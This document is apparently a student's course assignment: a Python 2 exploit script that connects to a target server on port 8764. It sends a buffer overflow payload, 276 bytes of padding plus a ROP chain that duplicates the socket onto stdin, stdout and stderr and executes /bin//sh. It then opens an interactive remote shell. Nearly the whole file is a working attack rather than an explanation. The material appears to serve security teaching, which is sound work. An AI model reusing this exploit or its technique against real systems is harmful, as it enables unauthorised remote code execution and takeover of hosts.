# Execute as below:
# python assign7payload2.py <insertIPAddress> 8764
# I used python version 2.7.10.  It does not work with python version 3.

import socket
import sys
import time
import telnetlib
import struct
from struct import pack

# these three functions were excerpted from the empty_exploit.py file on Sakai
# thank you!!
def readUntil(s, content, echo = True):
   x = ""
   while True:
      y = s.recv(1)
      if not y:
         return False
      x += y
      for v in content:
         if x.endswith(v):
            if echo:
               sys.stderr.write(x)
            return x

def ru(s, txt):
   return readUntil(s, [txt])

def interact(s):
   t = telnetlib.Telnet()                                                            
   t.sock = s                                                                        
   t.interact()

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

server_address = (sys.argv[1], 8764)
print("Connecting to %s port %s" % server_address)
sock.connect(server_address)
time.sleep(1)

# Create payload                                                                                                                                                                                                                                                    
# Padding 
p = 'A'*276

#Maintain the fd for client as 4
p += pack('<I', 0x08079004) # pop eax ; ret
p += pack('<I', 4)

#dup stdin
p += pack('<I', 0x08079004) # pop eax ; ret
p += pack('<I', 0x3f) 		# sys call for dup
p += pack('<I', 0x080481d1) # pop ebx ; ret
p += pack('<I', 4)          # socket file descriptor
p += pack('<I', 0x080ef35d) # pop ecx ; ret
p += pack('<I', 0)          # stdin
p += pack('<I', 0x0807df70) # int 0x80 ; ret

#dup stdout
p += pack('<I', 0x08079004) # pop eax ; ret
p += pack('<I', 0x3f)		# sys call for dup
p += pack('<I', 0x080481d1) # pop ebx ; ret
p += pack('<I', 4)			# socket file descriptor
p += pack('<I', 0x080ef35d) # pop ecx ; ret
p += pack('<I', 1)          # stdout
p += pack('<I', 0x0807df70) # int 0x80 ; ret

#dup stderr
p += pack('<I', 0x08079004) # pop eax ; ret
p += pack('<I', 0x3f)		# sys call for dup
p += pack('<I', 0x080481d1) # pop ebx ; ret
p += pack('<I', 4)			# socket file descriptor
p += pack('<I', 0x080ef35d) # pop ecx ; ret
p += pack('<I', 2)          # stderr
p += pack('<I', 0x0807df70) # int 0x80 ; ret

#execve a shell
#writeable address in .data into edx
p += pack('<I', 0x0807d85b) # pop edx ; ret
p += pack('<I', 0x08105060) # @ .data

#mov /bin into eax and write into .data addr in edx
p += pack('<I', 0x08079004) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0805e62b) # mov dword ptr [edx], eax ; ret

#.data addr +4 into edx
p += pack('<I', 0x0807d85b) # pop edx ; ret
p += pack('<I', 0x08105064) # @ .data + 4

#write //sh into .data addr +4
p += pack('<I', 0x08079004) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0805e62b) # mov dword ptr [edx], eax ; ret

#.data addr +8 into edx 
p += pack('<I', 0x0807d85b) # pop edx ; ret
p += pack('<I', 0x08105068) # @ .data + 8

#write a 00 in .data addr +8
p += pack('<I', 0x08049a43) # xor eax, eax ; ret
p += pack('<I', 0x0805e62b) # mov dword ptr [edx], eax ; ret

#addr of /bin//sh into ebx
p += pack('<I', 0x080481d1) # pop ebx ; ret
p += pack('<I', 0x08105060) # @ .data

#addr of 00 into ecx (envp)
p += pack('<I', 0x080ef35d) # pop ecx ; ret
p += pack('<I', 0x08105068) # @ .data + 8

#addr of 00 into edx (argv)
p += pack('<I', 0x0807d85b) # pop edx ; ret
p += pack('<I', 0x08105068) # @ .data + 8
 
#syscall number - 11 - into eax
p += pack('<I', 0x08079004) # pop eax ; ret
p += pack('<I', 11)

#int 80
p += pack('<I', 0x08048f72) # int 0x80
p += '\n'

#need to send exit to return from handleClient
exit = 'exit\n'

#send payload
sock.send(p)

#exit from handleClient to execute payload
time.sleep(1)
sock.send(exit)

interact(sock)






